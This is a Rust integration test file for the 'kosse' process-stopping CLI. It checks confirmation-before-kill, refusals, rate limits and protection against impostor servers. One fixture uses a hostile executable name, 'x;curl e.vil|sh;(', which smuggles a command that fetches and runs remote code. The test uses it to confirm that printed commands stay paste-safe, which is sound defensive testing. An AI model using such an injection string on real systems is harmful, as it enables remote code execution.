//! `kosse stop` and `kosse force` through the compiled binary, as a client of a running
//! `kosse serve` that may signal only the test's fixtures (`--act-only`). Expected identities and
//! ports come from the fixtures' own records and `lsof`; refusals are asserted by observing that
//! nothing changed.
#![expect(
    clippy::expect_used,
    clippy::panic,
    reason = "test helpers fail the test by panicking"
)]

mod support;

use std::{
    collections::BTreeSet,
    net::{IpAddr, Ipv4Addr, TcpListener},
    os::unix::process::ExitStatusExt,
    path::Path,
    process::{Command, Output},
    thread,
    time::{Duration, Instant},
};

use kosse_core::{
    action::{ActionResult, Ineligible, StaleReason},
    agent::{AGENT_SCHEMA_VERSION, ActionAnswer, CommandError, CommandErrorCode},
    model::{ProcessIdentity, Service},
    profiles::view::ProfileMatch,
};
use kosse_fixtures::{
    Fixture, FixtureSpec, live_start_time, lsof,
    protocol::Serve,
    repo::{Sandbox, git, init_repo},
};
use support::{NO_CONFIG, Server, eventually};

const V4: IpAddr = IpAddr::V4(Ipv4Addr::LOCALHOST);
const SEEN_WITHIN: Duration = Duration::from_secs(10);
const EXIT_WITHIN: Duration = Duration::from_secs(5);
/// The instance accepts one action per second; a refused request counts too.
const RATE_LIMITED_FOR: Duration = Duration::from_secs(5);

fn server_acting_on(fixtures: &[&Fixture]) -> Server {
    let pids: Vec<String> = fixtures.iter().map(|f| f.pid().to_string()).collect();
    Server::start_with(&[&format!("--act-only={}", pids.join(","))])
}

/// Runs `kosse <args>` in `dir`, retrying while the instance's one-action-per-second limit
/// refuses it (exit 3, `rateLimited`, nothing signalled).
fn run(dir: &Path, args: &[&str]) -> Output {
    let deadline = Instant::now() + RATE_LIMITED_FOR;
    loop {
        let output = Command::new(env!("CARGO_BIN_EXE_kosse"))
            .env("KOSSE_CONFIG_DIR", NO_CONFIG)
            .current_dir(dir)
            .args(args)
            .output()
            .expect("run kosse");
        let limited = output.status.code() == Some(3)
            && String::from_utf8_lossy(&output.stderr).contains("retry in a second");
        if !limited || Instant::now() >= deadline {
            return output;
        }
        thread::sleep(Duration::from_millis(200));
    }
}

/// `kosse <args>` once, without waiting out a rate limit.
fn once(dir: &Path, args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_kosse"))
        .env("KOSSE_CONFIG_DIR", NO_CONFIG)
        .current_dir(dir)
        .args(args)
        .output()
        .expect("run kosse")
}

/// Whether `line` is exactly `kosse stop|force <pid>.<start> --ports <p,…>`, optionally with
/// `--instance-port <n>`: nothing a shell could expand or run besides `kosse`.
fn is_bare_command(line: &str) -> bool {
    let digits = |word: &str| !word.is_empty() && word.bytes().all(|b| b.is_ascii_digit());
    let words: Vec<&str> = line.split(' ').collect();
    let head = matches!(
        words.as_slice(),
        ["kosse", "stop" | "force", identity, "--ports", ports, ..]
            if identity.split_once('.').is_some_and(|(pid, start)| digits(pid) && digits(start))
                && ports.split(',').all(digits)
    );
    head && match &words[5..] {
        [] => true,
        ["--instance-port", port] => digits(port),
        _ => false,
    }
}

/// The indented lines of a refusal: each a `#` comment or a bare command, so pasting them into
/// sh, bash, zsh or fish runs nothing but `kosse` (checked with `fish -n` too when fish exists).
/// Returns the commands.
fn paste_safe_commands(text: &str) -> Vec<String> {
    let indented: Vec<&str> = text
        .lines()
        .filter_map(|line| line.strip_prefix("  "))
        .collect();
    let mut commands = Vec::new();
    for line in &indented {
        if line.starts_with("# ") {
            continue;
        }
        assert!(is_bare_command(line), "not a bare command: {line:?}");
        commands.push((*line).to_owned());
    }
    if let Ok(fish) = Command::new("fish")
        .args(["-n", "-c", &indented.join("\n")])
        .output()
    {
        assert!(fish.status.success(), "fish -n: {}", stderr(&fish));
    }
    commands
}

/// `kosse <args> --instance-port <server>`.
fn kosse(dir: &Path, server: &Server, args: &[&str]) -> Output {
    let port = server.addr.port().to_string();
    run(dir, &[args, &["--instance-port", &port]].concat())
}

fn stderr(output: &Output) -> String {
    String::from_utf8_lossy(&output.stderr).into_owned()
}

fn stdout(output: &Output) -> String {
    String::from_utf8_lossy(&output.stdout).into_owned()
}

fn error_of(output: &Output) -> CommandError {
    assert!(output.stdout.is_empty(), "stdout carries only results");
    serde_json::from_slice(&output.stderr)
        .unwrap_or_else(|_| panic!("not a CommandError: {}", stderr(output)))
}

fn answer_of(output: &Output) -> ActionAnswer {
    let answer: ActionAnswer = serde_json::from_slice(&output.stdout)
        .unwrap_or_else(|_| panic!("not an ActionAnswer: {} {}", stdout(output), stderr(output)));
    assert_eq!(answer.schema_version, AGENT_SCHEMA_VERSION);
    answer
}

fn identity(fixture: &Fixture) -> ProcessIdentity {
    ProcessIdentity {
        pid: fixture.pid(),
        started_at_secs: Some(fixture.record().started_at_secs),
    }
}

/// The ports `lsof` sees the fixture listen on, ordered.
fn live_ports(fixture: &Fixture) -> Vec<u16> {
    let ports: BTreeSet<u16> = lsof::tcp_listeners(&[fixture.pid()])
        .expect("lsof")
        .into_iter()
        .map(|(_, _, port)| port)
        .collect();
    ports.into_iter().collect()
}

fn joined(ports: &[u16]) -> String {
    let ports: Vec<String> = ports.iter().map(ToString::to_string).collect();
    ports.join(",")
}

/// The confirming command the CLI must print for `fixture`, from its record and `lsof`.
fn confirming(verb: &str, fixture: &Fixture, server: &Server) -> String {
    format!(
        "kosse {verb} {}.{} --ports {} --instance-port {}",
        fixture.pid(),
        fixture.record().started_at_secs,
        joined(&live_ports(fixture)),
        server.addr.port()
    )
}

/// Runs a printed `kosse …` command line (it holds only numbers and flags).
fn run_printed(dir: &Path, command: &str) -> Output {
    let args: Vec<&str> = command
        .strip_prefix("kosse ")
        .expect("a kosse command")
        .split(' ')
        .collect();
    run(dir, &args)
}

/// Waits until the instance's snapshot holds a service that `matches`.
fn observed(server: &Server, matches: impl Fn(&Service) -> bool) -> Service {
    eventually(SEEN_WITHIN, || {
        server
            .snapshot()
            .observation?
            .services
            .into_iter()
            .find(|service| matches(service))
    })
    .expect("service in the instance's snapshot")
}

fn assert_untouched(fixture: &Fixture, ports: &[u16]) {
    assert_eq!(
        live_start_time(fixture.pid()),
        Some(fixture.record().started_at_secs),
        "fixture {} changed",
        fixture.pid()
    );
    assert_eq!(
        live_ports(fixture),
        ports,
        "fixture {} ports",
        fixture.pid()
    );
}

const REPO_PROFILE: &str =
    r#"{ "version": 1, "services": { "web": { "match": { "cwd": "." } } } }"#;

/// The agent's safe two-step: a service name, a port, or an identity without its ports signals
/// nothing and prints the one exact confirming command; that command stops the process.
#[test]
fn a_name_is_refused_with_the_command_that_then_stops_it() {
    let tree = Sandbox::new().expect("sandbox");
    let shop = tree.dir("shop").expect("dir");
    init_repo(&shop).expect("repo");
    tree.file("shop/kosse.json", REPO_PROFILE).expect("file");
    git(&shop, &["add", "-A"]).expect("add");
    git(&shop, &["commit", "-q", "-m", "profile"]).expect("commit");
    let shop = shop.canonicalize().expect("canonical");
    let mut fixture = Fixture::spawn(&FixtureSpec::new().listen(&[V4]).listen(&[V4]).cwd(&shop))
        .expect("fixture");
    let ports = live_ports(&fixture);
    assert_eq!(ports.len(), 2);
    let server = server_acting_on(&[&fixture]);
    observed(&server, |service| {
        service.process.identity == identity(&fixture)
            && service.profile
                == Some(ProfileMatch::Matched {
                    service: "web".to_owned(),
                })
    });
    let expected = confirming("stop", &fixture, &server);
    let shop_text = shop.to_str().expect("UTF-8 path").to_owned();

    let first_port = ports[0].to_string();
    let pid = fixture.pid().to_string();
    let pid_start = format!("{pid}.{}", fixture.record().started_at_secs);
    for args in [
        vec!["stop", "web"],
        vec!["stop", "web", "--here"],
        vec!["stop", first_port.as_str()],
        vec!["stop", pid.as_str(), "--ports", first_port.as_str()],
        vec!["stop", pid_start.as_str()],
    ] {
        let output = kosse(&shop, &server, &args);
        assert_eq!(
            output.status.code(),
            Some(3),
            "{args:?}: {}",
            stderr(&output)
        );
        assert!(output.stdout.is_empty(), "nothing on stdout: {args:?}");
        assert!(
            paste_safe_commands(&stderr(&output)).contains(&expected),
            "{args:?} must print {expected:?}: {}",
            stderr(&output)
        );
        assert_untouched(&fixture, &ports);
    }
    // Other tests run fixtures with a "web" service too: scope the name to this project.
    let refused = kosse(
        tree.root(),
        &server,
        &["stop", "web", "--project", &shop_text, "--json"],
    );
    assert_eq!(refused.status.code(), Some(3));
    let error = error_of(&refused);
    assert_eq!(error.error, CommandErrorCode::ConfirmationRequired);
    assert_eq!(error.confirm.len(), 1, "{error:?}");
    assert_eq!(error.confirm[0].command, expected);
    assert_eq!(error.confirm[0].identity, identity(&fixture));
    assert_eq!(error.confirm[0].ports, ports);
    assert_eq!(
        error.confirm[0].project.as_deref(),
        Some(shop_text.as_str())
    );

    let stopped = run_printed(&shop, &expected);
    assert_eq!(stopped.status.code(), Some(0), "{}", stderr(&stopped));
    let text = stdout(&stopped);
    assert!(text.starts_with("outcome: exited\n"), "{text}");
    assert!(
        text.contains(&format!("ports: {} (free)", ports_text(&ports))),
        "{text}"
    );
    let status = fixture.wait(EXIT_WITHIN).expect("fixture exited");
    assert_eq!(status.signal(), Some(15), "SIGTERM");
    assert!(live_ports(&fixture).is_empty(), "its ports are free");

    // "Stop what I left running" is met when it already exited and nobody holds its ports.
    let again = run_printed(&shop, &format!("{expected} --json"));
    assert_eq!(again.status.code(), Some(0), "{}", stderr(&again));
    let answer = answer_of(&again);
    assert!(answer.not_running, "{answer:?}");
    assert!(
        matches!(
            answer.result,
            ActionResult::Stale {
                reason: StaleReason::Exited | StaleReason::IdentityChanged
            }
        ),
        "{answer:?}"
    );
}

/// A process name built to run code when pasted (`;`, `|`, and `(` for fish's command
/// substitution) stays in a comment line; the confirming command holds only numbers.
#[test]
fn confirming_commands_are_paste_safe_for_a_hostile_process_name() {
    let fixture = Fixture::spawn(
        &FixtureSpec::new()
            .listen(&[V4])
            .executable_name("x;curl e.vil|sh;("),
    )
    .expect("fixture");
    let ports = live_ports(&fixture);
    // Refusals only: this server may signal nothing.
    let server = Server::start();
    observed(&server, |service| {
        service.process.identity == identity(&fixture)
    });
    let output = kosse(
        Path::new(ANYWHERE),
        &server,
        &["stop", &ports[0].to_string()],
    );
    assert_eq!(output.status.code(), Some(3), "{}", stderr(&output));
    let text = stderr(&output);
    assert_eq!(
        paste_safe_commands(&text),
        [confirming("stop", &fixture, &server)]
    );
    assert!(
        text.lines()
            .any(|line| line.starts_with("  # x;curl e.vil|sh;(")),
        "the name is shown, as a comment: {text}"
    );
    assert_untouched(&fixture, &ports);
}

fn ports_text(ports: &[u16]) -> String {
    let ports: Vec<String> = ports.iter().map(ToString::to_string).collect();
    ports.join(", ")
}

/// Force exists only within a stillRunning offer from a stop on the same instance, and is
/// never sent by the stop itself.
#[test]
fn a_term_ignoring_fixture_is_forced_only_after_a_still_running_stop() {
    let mut fixture =
        Fixture::spawn(&FixtureSpec::new().listen(&[V4]).ignore_term()).expect("fixture");
    let ports = live_ports(&fixture);
    let server = server_acting_on(&[&fixture]);
    observed(&server, |service| {
        service.process.identity == identity(&fixture)
    });
    let dir = Path::new(ANYWHERE);
    let id = format!("{}.{}", fixture.pid(), fixture.record().started_at_secs);
    let port_list = joined(&ports);
    let confirmed = ["--ports", port_list.as_str(), "--json"];

    let early = kosse(
        dir,
        &server,
        &[&["force", id.as_str()][..], &confirmed].concat(),
    );
    assert_eq!(early.status.code(), Some(3), "{}", stderr(&early));
    let error = error_of(&early);
    assert_eq!(error.error, CommandErrorCode::ForceNotOffered);
    assert_eq!(error.result, Some(ActionResult::ForceNotOffered));
    assert_eq!(
        error
            .confirm
            .iter()
            .map(|c| c.command.as_str())
            .collect::<Vec<_>>(),
        [confirming("stop", &fixture, &server)],
        "the refusal names the stop to run first"
    );
    assert_untouched(&fixture, &ports);

    let stop = kosse(
        dir,
        &server,
        &[&["stop", id.as_str()][..], &confirmed].concat(),
    );
    assert_eq!(stop.status.code(), Some(1), "{}", stderr(&stop));
    let answer = answer_of(&stop);
    assert!(
        matches!(
            &answer.result,
            ActionResult::StillRunning { target, ports: p, force_until_ms: Some(_) }
                if *target == identity(&fixture) && *p == ports
        ),
        "{answer:?}"
    );
    let force = answer.force_command.expect("force offered");
    assert_eq!(force, confirming("force", &fixture, &server));
    assert_untouched(&fixture, &ports);

    let forced = run_printed(dir, &format!("{force} --json"));
    assert_eq!(forced.status.code(), Some(0), "{}", stderr(&forced));
    assert!(matches!(
        answer_of(&forced).result,
        ActionResult::Exited { target, .. } if target == identity(&fixture)
    ));
    let status = fixture.wait(EXIT_WITHIN).expect("fixture exited");
    assert_eq!(status.signal(), Some(9), "SIGKILL");

    // The offer was used once; the process is gone, which is what force was for.
    let again = run_printed(dir, &force);
    assert_eq!(again.status.code(), Some(0), "{}", stderr(&again));
    assert!(
        stdout(&again).starts_with("outcome: notRunning\n"),
        "{}",
        stdout(&again)
    );
}

/// Where commands that need no project scope run.
const ANYWHERE: &str = "/";

/// A port set that is not every live port signals nothing and prints the full command, which then
/// works at once; once another process holds the ports of an exited one, it is named but never
/// suggested.
#[test]
fn a_stale_identity_or_port_set_is_refused_without_suggesting_another_process() {
    let mut first =
        Fixture::spawn(&FixtureSpec::new().listen(&[V4]).listen(&[V4])).expect("fixture");
    let ports = live_ports(&first);
    let server = server_acting_on(&[&first]);
    observed(&server, |service| {
        service.process.identity == identity(&first)
    });
    let dir = Path::new(ANYWHERE);
    let old = format!("{}.{}", first.pid(), first.record().started_at_secs);
    let one_port = ports[0].to_string();

    let partial = kosse(
        dir,
        &server,
        &["stop", &old, "--ports", &one_port, "--json"],
    );
    assert_eq!(partial.status.code(), Some(3), "{}", stderr(&partial));
    let error = error_of(&partial);
    assert_eq!(error.error, CommandErrorCode::Stale);
    assert_eq!(
        error.result,
        Some(ActionResult::Stale {
            reason: StaleReason::PortsChanged
        })
    );
    assert_eq!(
        error
            .confirm
            .iter()
            .map(|c| c.command.as_str())
            .collect::<Vec<_>>(),
        [confirming("stop", &first, &server)]
    );
    assert_untouched(&first, &ports);

    // The printed command works at once, although the refusal used the instance's
    // one-action-per-second slot (no retry helper here).
    let command = format!("{} --json", confirming("stop", &first, &server));
    let words: Vec<&str> = command.split(' ').skip(1).collect();
    let confirmed = once(dir, &words);
    assert_eq!(confirmed.status.code(), Some(0), "{}", stderr(&confirmed));
    assert!(matches!(
        answer_of(&confirmed).result,
        ActionResult::Exited { target, .. } if target == identity(&first)
    ));
    first.wait(EXIT_WITHIN).expect("fixture exited");

    // Another process now holds the old port: it is named, but no command is printed for it.
    let second = Fixture::spawn(&FixtureSpec::new().listen(&[V4]).port(ports[0]))
        .expect("successor fixture");
    let second_ports = live_ports(&second);
    observed(&server, |service| {
        service.process.identity == identity(&second)
    });
    let replaced = kosse(dir, &server, &["stop", &old, "--ports", &joined(&ports)]);
    assert_eq!(replaced.status.code(), Some(3), "{}", stderr(&replaced));
    let text = stderr(&replaced);
    assert!(paste_safe_commands(&text).is_empty(), "{text}");
    assert!(
        text.contains("A different process now holds these ports: ")
            && text.contains(&format!(
                "{}.{}",
                second.pid(),
                second.record().started_at_secs
            )),
        "{text}"
    );
    let replaced = kosse(
        dir,
        &server,
        &["stop", &old, "--ports", &joined(&ports), "--json"],
    );
    let error = error_of(&replaced);
    assert_eq!(error.error, CommandErrorCode::Stale);
    assert!(error.confirm.is_empty(), "{error:?}");
    assert_untouched(&second, &second_ports);
}

/// Kossé never stops itself, by identity or when a port names it.
#[test]
fn kosse_itself_is_refused() {
    let server = Server::start();
    let kosse_pid = server.child.0.id();
    let start = live_start_time(kosse_pid).expect("server start time");
    observed(&server, |service| service.process.identity.pid == kosse_pid);
    let dir = Path::new(ANYWHERE);
    let own_port = server.addr.port().to_string();

    let by_identity = kosse(
        dir,
        &server,
        &[
            "stop",
            &format!("{kosse_pid}.{start}"),
            "--ports",
            &own_port,
            "--json",
        ],
    );
    assert_eq!(
        by_identity.status.code(),
        Some(3),
        "{}",
        stderr(&by_identity)
    );
    let error = error_of(&by_identity);
    assert_eq!(error.error, CommandErrorCode::ActionRefused);
    assert_eq!(
        error.result,
        Some(ActionResult::Refused {
            reason: Ineligible::KosseItself
        })
    );

    let by_port = kosse(dir, &server, &["stop", &own_port, "--json"]);
    assert_eq!(by_port.status.code(), Some(3), "{}", stderr(&by_port));
    let error = error_of(&by_port);
    assert_eq!(error.error, CommandErrorCode::ActionRefused);
    assert!(
        error.confirm.is_empty(),
        "no command to stop Kossé: {error:?}"
    );

    assert_eq!(server.get("/api/health").status, 200, "Kossé still serves");
    assert_eq!(live_start_time(kosse_pid), Some(start));
}

/// A supervisor restarting its child is reported (exit 1), and the supervisor is never signalled.
#[test]
fn a_respawn_is_reported_as_a_negative_outcome() {
    let supervisor =
        Fixture::spawn(&FixtureSpec::new().listen(&[V4]).supervise()).expect("supervisor");
    let port = supervisor.record().endpoints[0].port();
    let server = server_acting_on(&[&supervisor]);
    let child = observed(&server, |service| {
        service.process.parent_pid == Some(supervisor.pid())
            && service
                .endpoints
                .iter()
                .any(|endpoint| endpoint.port == port)
    });
    let child_id = child.process.identity;
    let start = child_id.started_at_secs.expect("start");

    let output = kosse(
        Path::new(ANYWHERE),
        &server,
        &[
            "stop",
            &format!("{}.{start}", child_id.pid),
            "--ports",
            &port.to_string(),
        ],
    );
    assert_eq!(output.status.code(), Some(1), "{}", stderr(&output));
    let text = stdout(&output);
    assert!(text.starts_with("outcome: respawned\n"), "{text}");
    assert!(
        text.contains(&format!("parent: {} ", supervisor.pid())),
        "{text}"
    );
    assert_eq!(live_start_time(child_id.pid), None, "the child exited");
    assert_eq!(
        live_start_time(supervisor.pid()),
        Some(supervisor.record().started_at_secs),
        "the supervisor is never signalled"
    );
}

/// D1: without a verified instance nothing is signalled, and the error names how to start one.
#[test]
fn without_an_instance_nothing_is_signalled() {
    let fixture = Fixture::spawn(&FixtureSpec::new().listen(&[V4])).expect("fixture");
    let ports = live_ports(&fixture);
    // A loopback port nothing listens on once released.
    let free = TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
        .and_then(|listener| listener.local_addr())
        .expect("free port")
        .port();
    let id = format!("{}.{}", fixture.pid(), fixture.record().started_at_secs);
    let run = |json: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_kosse"))
            .env("KOSSE_CONFIG_DIR", NO_CONFIG)
            .args(["stop", &id, "--ports", &joined(&ports)])
            .args(["--instance-port", &free.to_string()])
            .args(json)
            .output()
            .expect("run kosse")
    };

    let output = run(&[]);
    assert_eq!(output.status.code(), Some(4), "{}", stderr(&output));
    assert!(
        stderr(&output).contains(&format!("`kosse serve --no-open --port {free} &`")),
        "{}",
        stderr(&output)
    );
    let output = run(&["--json"]);
    assert_eq!(output.status.code(), Some(4));
    assert_eq!(error_of(&output).error, CommandErrorCode::NoInstance);
    let output = once(
        Path::new(ANYWHERE),
        &[
            "stop",
            &id,
            "--ports",
            &joined(&ports),
            "--instance-port",
            "0",
        ],
    );
    assert_eq!(output.status.code(), Some(4), "{}", stderr(&output));
    assert!(!stderr(&output).contains("--port 0"), "{}", stderr(&output));
    assert_untouched(&fixture, &ports);
}

/// Something that is not Kossé on `--instance-port` is never sent a session request or an
/// action, and nothing is signalled.
#[test]
fn a_listener_that_is_not_kosse_gets_no_session_or_action() {
    let target = Fixture::spawn(&FixtureSpec::new().listen(&[V4])).expect("fixture");
    let target_ports = live_ports(&target);
    let impostor = Fixture::spawn(
        &FixtureSpec::new()
            .listen(&[V4])
            .serve(Serve::Title)
            .record(),
    )
    .expect("impostor");
    let port = impostor.record().endpoints[0].port();
    let id = format!("{}.{}", target.pid(), target.record().started_at_secs);
    for verb in ["stop", "force"] {
        let output = once(
            Path::new(ANYWHERE),
            &[
                verb,
                &id,
                "--ports",
                &joined(&target_ports),
                "--instance-port",
                &port.to_string(),
                "--json",
            ],
        );
        assert_eq!(output.status.code(), Some(4), "{}", stderr(&output));
        assert_eq!(error_of(&output).error, CommandErrorCode::NoInstance);
    }
    let received = impostor.received(port);
    assert!(
        received
            .iter()
            .any(|request| request.starts_with("GET /api/health ")),
        "the listener was verified, and refused: {received:?}"
    );
    assert!(
        received
            .iter()
            .all(|request| !request.contains("/api/session") && !request.starts_with("POST")),
        "{received:?}"
    );
    assert_untouched(&target, &target_ports);
}
